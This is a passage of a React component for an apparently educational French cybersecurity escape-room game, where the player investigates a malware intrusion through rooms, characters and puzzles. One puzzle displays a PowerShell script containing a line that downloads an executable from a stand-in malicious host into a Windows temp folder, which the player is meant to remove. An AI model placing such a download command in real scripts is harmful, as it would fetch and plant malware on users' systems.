import React, { useState } from 'react';
import { Link } from 'wouter';
import { GameProvider, useGame } from './context/GameContext';
import { 
  ArrowLeft, Info, HardDriveIcon, Clock, Coins, AlertTriangle, 
  MapIcon, HomeIcon, UsersIcon, MonitorIcon, HeadphonesIcon, 
  BriefcaseIcon, ShieldIcon, LockIcon
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Separator } from '@/components/ui/separator';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter, DialogTrigger, DialogClose } from '@/components/ui/dialog';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import PageTitle from '@/components/utils/PageTitle';

// Composant principal du jeu
const CyberEscapeParefeu: React.FC = () => {
  const { 
    gameState, 
    isLoading, 
    error, 
    isGameInitialized,
    missionBriefing,
    currentRoom,
    availableRooms,
    characters,
    activeCharacter,
    conversationHistory,
    isShowingSummary,
    
    // Actions
    initializeGame,
    enterRoom,
    interactWithNPC,
    interactWithItem,
    solvePuzzle,
    generatePlayerProfile,
    selectCharacter,
    setShowingSummary
  } = useGame();

  const [difficulty, setDifficulty] = useState<'easy' | 'normal' | 'hard'>('normal');
  const [showAboutDialog, setShowAboutDialog] = useState(false);
  const [userInput, setUserInput] = useState('');
  const [playerProfile, setPlayerProfile] = useState<any>(null);
  const [showPuzzleDialog, setShowPuzzleDialog] = useState(false);
  const [currentPuzzle, setCurrentPuzzle] = useState<{id: string, solution: string}>({id: '', solution: ''});
  const [puzzleResult, setPuzzleResult] = useState<{isCorrect: boolean, feedback: string} | null>(null);

  // Fonction pour démarrer une nouvelle partie
  const startNewGame = async () => {
    await initializeGame(difficulty);
  };

  // Fonction pour entrer dans une salle
  const handleRoomSelection = async (roomId: string) => {
    await enterRoom(roomId);
  };

  // Fonction pour interagir avec un personnage
  const handleCharacterInteraction = async () => {
    if (!activeCharacter || !userInput.trim()) return;
    
    await interactWithNPC(activeCharacter.id, userInput);
    setUserInput('');
  };

  // Fonction pour résoudre un puzzle
  const handleSolvePuzzle = async () => {
    if (!currentPuzzle.id || !currentPuzzle.solution.trim()) return;
    
    const result = await solvePuzzle(currentPuzzle.id, currentPuzzle.solution);
    setPuzzleResult(result);
    
    if (result.isCorrect) {
      // Fermer le dialogue après un délai
      setTimeout(() => {
        setShowPuzzleDialog(false);
        setPuzzleResult(null);
      }, 2000);
    }
  };
  
  // Fonction pour récupérer l'icône associée à une salle
  const getRoomIcon = (roomId: string) => {
    switch (roomId) {
      case 'hub':
        return <HomeIcon className="h-4 w-4 text-orange-300" />;
      case 'rh':
        return <UsersIcon className="h-4 w-4 text-orange-300" />;
      case 'it':
        return <MonitorIcon className="h-4 w-4 text-orange-300" />;
      case 'support':
        return <HeadphonesIcon className="h-4 w-4 text-orange-300" />;
      case 'direction':
        return <BriefcaseIcon className="h-4 w-4 text-orange-300" />;
      case 'salle-chiffree':
        return <ShieldIcon className="h-4 w-4 text-orange-300" />;
      default:
        return <AlertTriangle className="h-4 w-4 text-orange-300" />;
    }
  };
  
  // Fonction pour obtenir un message narratif sur l'emplacement actuel
  const getLocationMessage = (roomId: string) => {
    switch (roomId) {
      case 'hub':
        return "Le hub central est animé par les allées et venues du personnel, plusieurs écrans affichent des alertes de sécurité.";
      case 'rh':
        return "Le département RH est calme, avec des dossiers soigneusement rangés et plusieurs ordinateurs laissés déverrouillés.";
      case 'it':
        return "Les serveurs bourdonnent dans le département IT, des lignes de code défilent sur plusieurs écrans.";
      case 'support':
        return "L'équipe support est visiblement débordée, les téléphones ne cessent de sonner avec des signalements d'incidents.";
      case 'direction':
        return "Le bureau de la direction est spacieux et bien sécurisé, seuls quelques documents confidentiels sont visibles.";
      case 'salle-chiffree':
        return "Cette salle hautement sécurisée contient l'infrastructure critique de l'entreprise, l'accès est strictement contrôlé.";
      default:
        return "Vous examinez attentivement les lieux à la recherche d'indices.";
    }
  };
  
  // Fonction pour récupérer l'icône associée à un personnage selon son rôle
  const getCharacterIcon = (role: string) => {
    switch (role) {
      case 'Responsable RH':
        return <UsersIcon className="h-4 w-4 text-orange-300" />;
      case 'DSI':
        return <MonitorIcon className="h-4 w-4 text-orange-300" />;
      case 'Technicienne Support':
        return <HeadphonesIcon className="h-4 w-4 text-orange-300" />;
      case 'Directeur Général':
        return <BriefcaseIcon className="h-4 w-4 text-orange-300" />;
      case 'Collègue suspect':
        return <AlertTriangle className="h-4 w-4 text-orange-300" />;
      default:
        return <UsersIcon className="h-4 w-4 text-orange-300" />;
    }
  };
  
  // Fonction pour obtenir un indice sur chaque personnage
  const getCharacterHint = (characterId: string) => {
    switch (characterId) {
      case 'eddy':
        return "Semble nerveux depuis la panne du pare-feu. A récemment reçu plusieurs emails suspects.";
      case 'neil':
        return "Dirige l'équipe IT d'une main de fer. Possède tous les accès aux systèmes critiques.";
      case 'yousra':
        return "Connaît les systèmes mieux que personne. Travaille souvent en dehors des heures de bureau.";
      case 'guillaume':
        return "Autoritaire et pressé. S'intéresse beaucoup aux systèmes ces derniers temps.";
      case 'fares':
        return "Nouveau dans l'équipe. Propose souvent son aide pour les problèmes techniques.";
      default:
        return "Pourrait détenir des informations importantes sur l'incident en cours.";
    }
  };

  // Fonction pour générer le profil du joueur à la fin
  const handleGenerateProfile = async () => {
    const profile = await generatePlayerProfile();
    setPlayerProfile(profile);
    setShowingSummary(true);
  };

  // Afficher l'écran d'introduction si le jeu n'est pas encore initialisé
  if (!isGameInitialized) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-red-950 via-red-900 to-orange-900 text-white p-4">
        <div className="container mx-auto max-w-4xl">
          <div className="flex items-center justify-between mb-6">
            <Link href="/cyber/arcade">
              <Button variant="ghost" className="text-white hover:bg-red-800/20">
                <ArrowLeft className="mr-2 h-4 w-4" /> Retour
              </Button>
            </Link>
            
            <Button 
              variant="outline" 
              className="flex items-center gap-2"
              onClick={() => setShowAboutDialog(true)}
            >
              <Info className="h-4 w-4" />
              <span>À propos</span>
            </Button>
          </div>
          
          <div className="flex flex-col items-center justify-center py-10">
            <HardDriveIcon className="h-24 w-24 text-red-500 mb-6" />
            <h1 className="text-4xl font-bold mb-6 text-center">CYBER ESCAPE: LE PARE-FEU EST TOMBÉ</h1>
            <p className="text-xl text-center mb-10 max-w-2xl">
              Un malware a infiltré le système et contourné le pare-feu de l'entreprise. 
              En tant que Responsable Cybersécurité, vous devez identifier l'origine de l'attaque,
              stopper la menace et restaurer la sécurité avant qu'il ne soit trop tard.
            </p>
            
            <div className="bg-black/30 p-6 rounded-xl w-full max-w-lg mb-10">
              <h2 className="text-xl font-semibold mb-4">Choisissez la difficulté</h2>
              
              <div className="grid grid-cols-3 gap-4 mb-6">
                <Button 
                  variant={difficulty === 'easy' ? 'default' : 'outline'}
                  className={difficulty === 'easy' ? 'bg-green-700 hover:bg-green-800' : 'border-green-700 text-green-400 hover:border-green-500'}
                  onClick={() => setDifficulty('easy')}
                >
                  Facile
                </Button>
                <Button 
                  variant={difficulty === 'normal' ? 'default' : 'outline'}
                  className={difficulty === 'normal' ? 'bg-orange-700 hover:bg-orange-800' : 'border-orange-700 text-orange-400 hover:border-orange-500'}
                  onClick={() => setDifficulty('normal')}
                >
                  Normal
                </Button>
                <Button 
                  variant={difficulty === 'hard' ? 'default' : 'outline'}
                  className={difficulty === 'hard' ? 'bg-red-700 hover:bg-red-800' : 'border-red-700 text-red-400 hover:border-red-500'}
                  onClick={() => setDifficulty('hard')}
                >
                  Difficile
                </Button>
              </div>
              
              <div className="mb-6">
                <h3 className="text-lg font-medium mb-2">Paramètres de difficulté:</h3>
                <ul className="space-y-2 text-sm">
                  <li className="flex items-center">
                    <span className="font-medium mr-2">Facile:</span> 
                    <span>1200 crédits, 60 minutes, indices plus explicites</span>
                  </li>
                  <li className="flex items-center">
                    <span className="font-medium mr-2">Normal:</span> 
                    <span>1000 crédits, 45 minutes, indices standards</span>
                  </li>
                  <li className="flex items-center">
                    <span className="font-medium mr-2">Difficile:</span> 
                    <span>800 crédits, 30 minutes, indices subtils</span>
                  </li>
                </ul>
              </div>
              
              <Button 
                className="w-full bg-red-600 hover:bg-red-700 text-white"
                onClick={startNewGame}
                disabled={isLoading}
              >
                {isLoading ? 'Initialisation...' : 'Commencer la mission'}
              </Button>
            </div>
          </div>
        </div>
        
        {/* Dialogue À propos */}
        <Dialog open={showAboutDialog} onOpenChange={setShowAboutDialog}>
          <DialogContent className="max-w-3xl bg-gray-950 border-red-900 text-white">
            <DialogHeader>
              <DialogTitle className="text-2xl font-bold">À propos de "Le Pare-feu est tombé"</DialogTitle>
              <DialogDescription className="text-red-300">
                Plongez dans une crise cybersécurité réaliste et contre-la-montre
              </DialogDescription>
            </DialogHeader>
            
            <div className="prose prose-invert max-w-none">
              <p>
                Dans ce jeu d'escape room cybersécurité, vous incarnez un Responsable Sécurité des Systèmes d'Information (RSSI) 
                qui doit faire face à une situation de crise. Un malware sophistiqué a infiltré le réseau de l'entreprise, 
                contournant les pare-feu et les systèmes de défense.
              </p>
              
              <h3 className="text-xl font-bold mt-4 mb-2">Votre mission</h3>
              
              <p>
                Vous disposez d'un temps limité et d'un budget restreint pour explorer les différentes salles de l'entreprise, 
                interagir avec les employés clés, et collecter des indices pour identifier la source de l'intrusion et la neutraliser.
              </p>
              
              <h3 className="text-xl font-bold mt-4 mb-2">Fonctionnement du jeu</h3>
              
              <ul className="list-disc pl-6 space-y-1">
                <li>Explorez différentes salles (Hub, RH, IT, Support, Direction, Salle sécurisée)</li>
                <li>Interagissez avec les personnages pour obtenir des informations cruciales</li>
                <li>Récoltez des indices et des mots de passe</li>
                <li>Résolvez des énigmes techniques pour progresser</li>
                <li>Dépensez judicieusement vos crédits pour débloquer des ressources</li>
                <li>Battez contre la montre pour stopper le malware avant qu'il ne prenne le contrôle total</li>
              </ul>
              
              <h3 className="text-xl font-bold mt-4 mb-2">Progression et déverrouillage</h3>
              
              <p>
                Au début du jeu, certaines salles sont verrouillées et nécessitent que vous accomplissiez des objectifs spécifiques pour y accéder :
              </p>
              
              <ul className="list-disc pl-6 space-y-1">
                <li><strong>Hub et RH</strong> : Accessibles dès le début</li>
                <li><strong>IT</strong> : Se déverrouille après avoir parlé aux personnages du Hub et obtenu les premières informations</li>
                <li><strong>Support</strong> : Nécessite de résoudre l'énigme "Analyse d'IP suspecte" dans les outils de résolution</li>
                <li><strong>Direction</strong> : Demande d'avoir collecté au moins deux éléments dans l'inventaire et d'avoir visité l'IT</li>
                <li><strong>Salle sécurisée</strong> : Exige un code de sécurité trouvé dans le bureau de la Direction</li>
              </ul>
              
              <p className="text-sm text-orange-300 italic mt-2">
                Astuce : Pour débloquer une salle, vous devrez parfois examiner les indices dans votre inventaire, 
                interroger les personnages ou résoudre des énigmes via les "Outils de résolution" accessibles depuis chaque salle.
              </p>
                            
              <h3 className="text-xl font-bold mt-4 mb-2">Compétences développées</h3>
              
              <ul className="list-disc pl-6 space-y-1 mb-4">
                <li>Gestion de crise cybersécurité</li>
                <li>Analyse de logs et détection d'intrusions</li>
                <li>Identification et neutralisation de malwares</li>
                <li>Communication efficace avec les différentes parties prenantes</li>
                <li>Priorisation des actions dans un contexte d'urgence</li>
                <li>Gestion de ressources limitées (temps et budget)</li>
              </ul>
            </div>
            
            <DialogFooter>
              <DialogClose asChild>
                <Button>Fermer</Button>
              </DialogClose>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </div>
    );
  }

  // Afficher l'interface principale du jeu
  return (
    <div className="min-h-screen bg-gradient-to-b from-red-950 via-red-900 to-orange-900 text-white">
      <div className="container mx-auto py-6 px-4">
        <div className="flex items-center justify-between mb-6">
          <Link href="/cyber/arcade">
            <Button variant="ghost" className="text-white hover:bg-red-800/20">
              <ArrowLeft className="mr-2 h-4 w-4" /> Arcade
            </Button>
          </Link>
          
          <div className="flex items-center gap-3">
            {gameState && (
              <>
                <Badge variant="outline" className="flex items-center gap-1 py-1 border-orange-700">
                  <Clock className="h-3 w-3" />
                  <span>{gameState.timeRemaining} min</span>
                </Badge>
                <Badge variant="outline" className="flex items-center gap-1 py-1 border-yellow-700">
                  <Coins className="h-3 w-3" />
                  <span>{gameState.budget} crédits</span>
                </Badge>
              </>
            )}
            
            <Button 
              variant="outline" 
              className="flex items-center gap-2"
              onClick={() => setShowAboutDialog(true)}
            >
              <Info className="h-4 w-4" />
              <span className="hidden sm:inline">À propos</span>
            </Button>
          </div>
        </div>
        
        {/* Titre et briefing de mission */}
        {missionBriefing && (
          <div className="mb-8">
            <h1 className="text-3xl font-bold mb-4">{missionBriefing.title}</h1>
            <p className="text-lg mb-4">{missionBriefing.briefing}</p>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-4">
              <div>
                <h3 className="text-lg font-semibold mb-2">Objectifs:</h3>
                <ul className="list-disc pl-6 space-y-1">
                  {missionBriefing.initialObjectives.map((objective, index) => (
                    <li key={index}>{objective}</li>
                  ))}
                </ul>
              </div>
              <div>
                <h3 className="text-lg font-semibold mb-2">Conseils:</h3>
                <ul className="list-disc pl-6 space-y-1">
                  {missionBriefing.tips.map((tip, index) => (
                    <li key={index}>{tip}</li>
                  ))}
                </ul>
              </div>
            </div>
          </div>
        )}
        
        {/* Sélection de salle avec carte interactive */}
        <div className="mb-8">
          <h2 className="text-xl font-semibold mb-3 flex items-center">
            <MapIcon className="mr-2 h-5 w-5 text-orange-500" />
            Navigation
          </h2>
          <div className="relative p-4 bg-black/30 rounded-lg border border-red-900/30 mb-4">
            <div className="absolute inset-0 opacity-10 overflow-hidden rounded-lg">
              <div className="w-full h-full bg-[url('/assets/cyber-map-bg.jpg')] bg-cover bg-center"></div>
            </div>
            
            <div className="relative z-10">
              {/* Diagramme de connexions des salles */}
              <div className="hidden lg:block h-[120px] relative mb-2">
                <svg className="w-full h-full" viewBox="0 0 800 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                  {/* Lignes de connexion entre les salles */}
                  <line x1="150" y1="50" x2="250" y2="20" stroke={gameState?.unlockedRooms.includes('rh') ? "#ef4444" : "#6b7280"} strokeWidth="2" />
                  <line x1="150" y1="50" x2="250" y2="80" stroke={gameState?.unlockedRooms.includes('it') ? "#ef4444" : "#6b7280"} strokeWidth="2" />
                  <line x1="250" y1="80" x2="400" y2="80" stroke={gameState?.unlockedRooms.includes('support') ? "#ef4444" : "#6b7280"} strokeWidth="2" />
                  <line x1="250" y1="20" x2="400" y2="20" stroke={gameState?.unlockedRooms.includes('direction') ? "#ef4444" : "#6b7280"} strokeWidth="2" />
                  <line x1="400" y1="20" x2="550" y2="50" stroke={gameState?.unlockedRooms.includes('salle-chiffree') ? "#ef4444" : "#6b7280"} strokeWidth="2" />
                  <line x1="400" y1="80" x2="550" y2="50" stroke={gameState?.unlockedRooms.includes('salle-chiffree') ? "#ef4444" : "#6b7280"} strokeWidth="2" />
                  
                  {/* Cercles aux points d'intersection */}
                  <circle cx="150" cy="50" r="8" fill={currentRoom?.id === 'hub' ? "#ef4444" : "#1f2937"} stroke="#ef4444" strokeWidth="2" />
                  <circle cx="250" cy="20" r="8" fill={currentRoom?.id === 'rh' ? "#ef4444" : "#1f2937"} stroke={gameState?.unlockedRooms.includes('rh') ? "#ef4444" : "#6b7280"} strokeWidth="2" />
                  <circle cx="250" cy="80" r="8" fill={currentRoom?.id === 'it' ? "#ef4444" : "#1f2937"} stroke={gameState?.unlockedRooms.includes('it') ? "#ef4444" : "#6b7280"} strokeWidth="2" />
                  <circle cx="400" cy="20" r="8" fill={currentRoom?.id === 'direction' ? "#ef4444" : "#1f2937"} stroke={gameState?.unlockedRooms.includes('direction') ? "#ef4444" : "#6b7280"} strokeWidth="2" />
                  <circle cx="400" cy="80" r="8" fill={currentRoom?.id === 'support' ? "#ef4444" : "#1f2937"} stroke={gameState?.unlockedRooms.includes('support') ? "#ef4444" : "#6b7280"} strokeWidth="2" />
                  <circle cx="550" cy="50" r="8" fill={currentRoom?.id === 'salle-chiffree' ? "#ef4444" : "#1f2937"} stroke={gameState?.unlockedRooms.includes('salle-chiffree') ? "#ef4444" : "#6b7280"} strokeWidth="2" />
                  
                  {/* Textes indiquant les salles */}
                  <text x="150" y="90" textAnchor="middle" fill="white" fontSize="12">Hub Central</text>
                  <text x="250" y="10" textAnchor="middle" fill="white" fontSize="12">Dépt. RH</text>
                  <text x="250" y="100" textAnchor="middle" fill="white" fontSize="12">Dépt. IT</text>
                  <text x="400" y="10" textAnchor="middle" fill="white" fontSize="12">Direction</text>
                  <text x="400" y="100" textAnchor="middle" fill="white" fontSize="12">Support</text>
                  <text x="550" y="40" textAnchor="middle" fill="white" fontSize="12">Salle</text>
                  <text x="550" y="60" textAnchor="middle" fill="white" fontSize="12">Sécurisée</text>
                </svg>
              </div>
              
              {/* Message d'aide pour les salles verrouillées */}
              {availableRooms.some(room => !room.isAccessible) && (
                <Alert className="mb-4 bg-yellow-900/20 text-yellow-100 border-yellow-600">
                  <AlertTriangle className="h-4 w-4 text-yellow-400" />
                  <AlertTitle>Salles verrouillées</AlertTitle>
                  <AlertDescription>
                    Certaines salles sont inaccessibles et se déverrouillent progressivement à mesure que vous avancez dans l'enquête.
                    Progressez en interagissant avec les personnages et en analysant les informations obtenues.
                    <Button variant="link" className="p-0 h-auto text-yellow-400 hover:text-yellow-300" onClick={() => setShowAboutDialog(true)}>
                      Voir les conditions de déverrouillage
                    </Button>
                  </AlertDescription>
                </Alert>
              )}
              
              {/* Grille de boutons pour navigation mobile et tablette */}
              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
                {availableRooms.map(room => (
                  <div
                    key={room.id}
                    className={`transition-transform duration-150 ${room.isAccessible ? 'hover:scale-105 active:scale-95' : ''}`}
                  >
                    <Button
                      onClick={() => handleRoomSelection(room.id)}
                      disabled={!room.isAccessible || isLoading}
                      variant={currentRoom?.id === room.id ? "default" : "outline"}
                      title={!room.isAccessible ? "Cette salle est verrouillée. Explorez les autres zones pour obtenir les informations nécessaires au déverrouillage." : ""}
                      className={`
                        relative w-full py-3 group transition-all duration-200
                        ${currentRoom?.id === room.id ? 'bg-red-700 shadow-lg shadow-red-700/30' : 'bg-black/40'} 
                        ${!room.isAccessible ? 'opacity-50 cursor-not-allowed' : 'hover:bg-red-900/80'}
                        border-red-900/50
                      `}
                    >
                      {getRoomIcon(room.id)}
                      <span className="ml-2">{room.name}</span>
                      
                      {/* Indicateur d'état pour les salles */}
                      {room.isAccessible && (
                        <span className="absolute top-1 right-1 h-2 w-2 rounded-full bg-green-500"></span>
                      )}
                      {!room.isAccessible && (
                        <LockIcon className="absolute top-1 right-1 h-3 w-3 text-gray-500" />
                      )}
                    </Button>
                  </div>
                ))}
              </div>
            </div>
          </div>
          
          {/* Description de la navigation actuelle */}
          {currentRoom && (
            <div className="text-sm text-gray-300 italic ml-2">
              {getLocationMessage(currentRoom.id)}
            </div>
          )}
        </div>
        
        {/* Affichage de la salle actuelle */}
        {currentRoom && (
          <div className="mb-8">
            <h2 className="text-xl font-semibold mb-4">{currentRoom.name}</h2>
            
            {/* Liste des personnages avec effets visuels améliorés */}
            <div className="relative mb-6">
              <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-r from-red-900/50 via-transparent to-red-900/50 blur-xl opacity-20 -z-10"></div>
              
              {characters.length > 0 ? (
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                  {characters.map(character => (
                    <div 
                      key={character.id}
                      className={`
                        transition-all duration-300 transform 
                        ${activeCharacter?.id === character.id ? 'scale-105' : 'hover:scale-102'}
                      `}
                    >
                      <Card 
                        className={`
                          overflow-hidden border-orange-900/50 
                          ${activeCharacter?.id === character.id 
                            ? 'ring-2 ring-red-500 shadow-lg shadow-red-500/20' 
                            : 'hover:shadow-md hover:shadow-red-900/30'}
                          transition-all cursor-pointer relative
                        `}
                        onClick={() => selectCharacter(character)}
                      >
                        <div className="absolute inset-0 bg-gradient-to-br from-black/10 via-transparent to-red-900/30 z-0"></div>
                        
                        {/* Indicateur visuel pour personnage sélectionné */}
                        {activeCharacter?.id === character.id && (
                          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-500 via-orange-500 to-red-500"></div>
                        )}
                        
                        <CardHeader className="pb-2 relative z-10">
                          <div className="flex justify-between items-start">
                            <div>
                              <CardTitle className="text-xl font-bold">{character.name}</CardTitle>
                              <CardDescription className="text-orange-300 font-medium">{character.role}</CardDescription>
                            </div>
                            
                            {/* Icône basée sur le rôle */}
                            <div className={`
                              p-2 rounded-full bg-black/30 border border-orange-900/30
                              ${activeCharacter?.id === character.id ? 'bg-red-900/50' : ''}
                            `}>
                              {getCharacterIcon(character.role)}
                            </div>
                          </div>
                        </CardHeader>
                        
                        <CardContent className="relative z-10">
                          <div className="flex flex-wrap gap-1 mb-2">
                            {character.traits.map((trait, index) => (
                              <Badge 
                                key={index} 
                                variant="outline" 
                                className="bg-red-950/50 border-orange-900/30 px-2 py-1 text-xs"
                              >
                                {trait}
                              </Badge>
                            ))}
                          </div>
                          
                          <div className="mt-3 text-xs text-gray-400 italic">
                            {getCharacterHint(character.id)}
                          </div>
                        </CardContent>
                        
                        {/* Bouton d'interaction */}
                        <CardFooter className="pt-1 pb-3 relative z-10">
                          <Button 
                            variant="ghost" 
                            size="sm"
                            className="w-full border border-orange-900/30 hover:bg-red-900/30 text-orange-300"
                          >
                            Interroger
                          </Button>
                        </CardFooter>
                      </Card>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="bg-black/30 rounded-lg p-6 border border-red-900/20 text-center">
                  <div className="flex flex-col items-center justify-center text-gray-400">
                    <UsersIcon className="h-10 w-10 mb-3 text-red-900/50" />
                    <p>Aucun personnel présent dans cette salle.</p>
                    <p className="text-sm mt-2 italic">Explorez d'autres zones pour trouver des interlocuteurs.</p>
                  </div>
                </div>
              )}
            </div>
            
            {/* Conversation avec un personnage actif */}
            {activeCharacter && (
              <div className="bg-black/30 rounded-lg p-4">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-lg font-semibold">Conversation avec {activeCharacter.name}</h3>
                  <Button variant="ghost" onClick={() => selectCharacter(null)}>
                    Terminer
                  </Button>
                </div>
                
                <div className="h-64 overflow-y-auto bg-black/30 rounded p-3 mb-4">
                  {conversationHistory[activeCharacter.id]?.map((message, index) => (
                    <div 
                      key={index} 
                      className={`mb-3 ${
                        message.sender === 'player' 
                          ? 'text-right' 
                          : message.sender === 'system' 
                            ? 'text-center italic text-gray-400' 
                            : ''
                      }`}
                    >
                      <div 
                        className={`
                          inline-block rounded-lg px-3 py-2 max-w-[80%] break-words
                          ${message.sender === 'player' 
                            ? 'bg-blue-800 text-white' 
                            : message.sender === 'npc' 
                              ? 'bg-red-800/60 text-white' 
                              : 'bg-transparent'}
                        `}
                      >
                        {message.content}
                      </div>
                    </div>
                  ))}
                </div>
                
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={userInput}
                    onChange={(e) => setUserInput(e.target.value)}
                    placeholder="Tapez votre message..."
                    className="flex-1 bg-black/30 border border-red-900/50 rounded p-2 text-white"
                    onKeyDown={(e) => e.key === 'Enter' && handleCharacterInteraction()}
                  />
                  <Button 
                    onClick={handleCharacterInteraction}
                    disabled={isLoading || !userInput.trim()}
                  >
                    Envoyer
                  </Button>
                </div>
              </div>
            )}
          </div>
        )}
        
        {/* Inventaire */}
        {gameState?.inventory && gameState.inventory.length > 0 && (
          <div className="mb-8">
            <h2 className="text-xl font-semibold mb-3">Inventaire</h2>
            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
              {gameState.inventory.map((item, index) => (
                <Button
                  key={index}
                  variant="outline"
                  className="bg-black/20 border-orange-900/50 justify-start overflow-hidden"
                  onClick={() => interactWithItem(item.id)}
                >
                  <div className="truncate">{item.name}</div>
                </Button>
              ))}
            </div>
          </div>
        )}
        
        {/* Outils de résolution d'énigmes */}
        <div className="mb-8">
          <h2 className="text-xl font-semibold mb-3">Outils de résolution</h2>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <Card className="border-orange-900/50 bg-gradient-to-br from-black/30 to-red-950/50">
              <CardHeader>
                <CardTitle className="text-lg">Analyse d'IP suspecte</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-sm mb-3">Identifiez une adresse IP suspecte dans les logs.</p>
              </CardContent>
              <CardFooter>
                <Button 
                  variant="outline"
                  className="w-full"
                  onClick={() => {
                    setCurrentPuzzle({id: 'ip-suspecte', solution: ''});
                    setShowPuzzleDialog(true);
                    setPuzzleResult(null);
                  }}
                >
                  Résoudre
                </Button>
              </CardFooter>
            </Card>
            
            <Card className="border-orange-900/50 bg-gradient-to-br from-black/30 to-red-950/50">
              <CardHeader>
                <CardTitle className="text-lg">Script PowerShell</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-sm mb-3">Modifiez un script pour supprimer le code malveillant.</p>
              </CardContent>
              <CardFooter>
                <Button 
                  variant="outline"
                  className="w-full"
                  onClick={() => {
                    setCurrentPuzzle({id: 'script-powershell', solution: ''});
                    setShowPuzzleDialog(true);
                    setPuzzleResult(null);
                  }}
                >
                  Résoudre
                </Button>
              </CardFooter>
            </Card>
            
            <Card className="border-orange-900/50 bg-gradient-to-br from-black/30 to-red-950/50">
              <CardHeader>
                <CardTitle className="text-lg">Fichier USB crypté</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-sm mb-3">Décodez le fichier chiffré de la clé USB.</p>
              </CardContent>
              <CardFooter>
                <Button 
                  variant="outline"
                  className="w-full"
                  onClick={() => {
                    setCurrentPuzzle({id: 'decode-usb', solution: ''});
                    setShowPuzzleDialog(true);
                    setPuzzleResult(null);
                  }}
                >
                  Résoudre
                </Button>
              </CardFooter>
            </Card>
          </div>
        </div>
        
        {/* Dialogue de résolution d'énigmes */}
        <Dialog open={showPuzzleDialog} onOpenChange={setShowPuzzleDialog}>
          <DialogContent className="bg-gray-950 border-red-900 text-white">
            <DialogHeader>
              <DialogTitle>
                {currentPuzzle.id === 'ip-suspecte' && "Analyse d'IP suspecte"}
                {currentPuzzle.id === 'script-powershell' && "Correction du script PowerShell"}
                {currentPuzzle.id === 'decode-usb' && "Décodage du fichier USB"}
                {currentPuzzle.id === 'ordre-redemarrage' && "Plan de redémarrage"}
                {currentPuzzle.id === 'mot-passe-final' && "Terminal principal"}
              </DialogTitle>
            </DialogHeader>
            
            <div>
              {currentPuzzle.id === 'ip-suspecte' && (
                <div>
                  <p className="mb-3">Plusieurs connexions ont été enregistrées dans les logs. Identifiez l'adresse IP suspecte.</p>
                  <pre className="bg-black/50 p-3 rounded text-xs mb-4 overflow-x-auto">
                    {'05/06/2025 02:15:31 - 192.168.1.45 - /admin/login - 200\n' +
                     '05/06/2025 02:32:12 - 192.168.1.22 - /dashboard - 200\n' + 
                     '05/06/2025 03:44:05 - 185.191.127.43 - /admin/config - 200\n' + 
                     '05/06/2025 03:55:18 - 185.191.127.43 - /system/export - 200\n' +
                     '05/06/2025 04:02:44 - 192.168.1.45 - /dashboard - 200'}
                  </pre>
                </div>
              )}
              
              {currentPuzzle.id === 'script-powershell' && (
                <div>
                  <p className="mb-3">Un script PowerShell automatique contient une ligne malveillante. Modifiez-le pour supprimer la menace.</p>
                  <pre className="bg-black/50 p-3 rounded text-xs mb-4 overflow-x-auto whitespace-pre-wrap">
                    {'$updateServer = "internal-update.company.com"\n' +
                     '$logPath = "C:\\Logs\\updates.log"\n\n' +
                     '# Vérification des mises à jour\n' +
                     'Write-Host "Vérification des mises à jour..."\n' +
                     '# Téléchargement du script de mise à jour\n' +
                     'Invoke-WebRequest -Uri "http://updateme.ru/agent.exe" -OutFile "C:\\Windows\\Temp\\update.exe"\n' +
                     '# Exécution de la mise à jour\n' +
                     'Write-Host "Installation des mises à jour..."'}
                  </pre>
                </div>
              )}
              
              {currentPuzzle.id === 'decode-usb' && (
                <div>
                  <p className="mb-3">La clé USB contient un fichier chiffré en deux étapes: ROT13 puis Base64. Quel est le mot caché?</p>
                  <div className="grid grid-cols-2 gap-4 mb-4">
                    <div>
                      <p className="font-bold mb-1">Première partie (ROT13):</p>
                      <pre className="bg-black/50 p-2 rounded text-xs">Vafgnapr vf zl anzr</pre>
                    </div>
                    <div>
                      <p className="font-bold mb-1">Seconde partie (Base64):</p>
                      <pre className="bg-black/50 p-2 rounded text-xs">SW5jaWRlbnQgaW4gY29ycmVjdCBzZWN0aW9u</pre>
                    </div>
                  </div>
                  <p className="text-sm">Indice: ROT13 décale chaque lettre de 13 positions dans l'alphabet.</p>
                </div>
              )}
              
              {puzzleResult && (
                <Alert className={puzzleResult.isCorrect ? "bg-green-950 border-green-700" : "bg-red-950 border-red-700"}>
                  <AlertTitle>{puzzleResult.isCorrect ? "Réussite!" : "Incorrect"}</AlertTitle>
                  <AlertDescription>{puzzleResult.feedback}</AlertDescription>
                </Alert>
              )}
              
              <div className="mt-4">
                <input
                  type="text"
                  value={currentPuzzle.solution}
                  onChange={(e) => setCurrentPuzzle({...currentPuzzle, solution: e.target.value})}
                  placeholder="Entrez votre solution..."
                  className="w-full bg-black/30 border border-red-900/50 rounded p-2 text-white mb-4"
                />
                
                <div className="flex justify-between">
                  <Button variant="ghost" onClick={() => setShowPuzzleDialog(false)}>
                    Annuler
                  </Button>
                  <Button 
                    onClick={handleSolvePuzzle}
                    disabled={!currentPuzzle.solution.trim() || isLoading}
                  >
                    Soumettre
                  </Button>
                </div>
              </div>
            </div>
          </DialogContent>
        </Dialog>
        
        {/* Profil du joueur (résumé de fin) */}
        {isShowingSummary && playerProfile && (
